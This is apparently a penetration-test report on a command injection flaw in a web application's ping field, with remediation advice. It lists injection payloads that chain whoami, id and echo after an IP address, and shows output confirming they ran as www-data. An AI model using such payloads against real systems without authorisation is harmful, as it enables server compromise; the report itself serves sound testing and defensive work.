# Command Injection Vulnerability Test Report

## 1. Objective

The goal of this test was to evaluate whether the `ping` input field in the target web application is vulnerable to command injection attacks, which could allow an attacker to execute arbitrary system commands on the server.

## 2. Methodology

Various payloads were crafted to attempt command chaining after the `ping` command. These payloads were sent through the web form input:

```bash
127.0.0.1; whoami; echo END
127.0.0.1 && id && echo DONE
127.0.0.1; echo test123
```
The inclusion of echo END and echo DONE served as markers to verify if the injected commands executed.

## 3. Observed Results
The server executed the ping command as expected.

Additionally, the injected commands executed successfully, as evidenced by the following output fragments:

The current user, e.g., www-data.

The process ID and group information from id.

Custom marker strings such as END and DONE.

Arbitrary strings such as test123.

Example observed output:

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.036 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.050 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.053 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3061ms
rtt min/avg/max/mdev = 0.036/0.044/0.053/0.007 ms
www-data
END

## 4. Analysis
The web application concatenates user input directly into system commands without proper sanitization or validation.

This allows arbitrary OS command execution via injection.

Such vulnerabilities pose a critical security risk, enabling attackers to potentially gain full control over the server.

## 5. Recommendations
Implement strict input validation, allowing only valid IP addresses or hostnames.

Avoid direct concatenation of user inputs into shell commands.

Utilize safe system call APIs that separate command and arguments (e.g., subprocess.run with argument lists in Python).

Apply the principle of least privilege to the web server processes.

Monitor server logs for suspicious command execution attempts.

## 6. Conclusion
The ping input field in the tested application is vulnerable to command injection. Immediate remediation is necessary to prevent potential exploitation and system compromise.
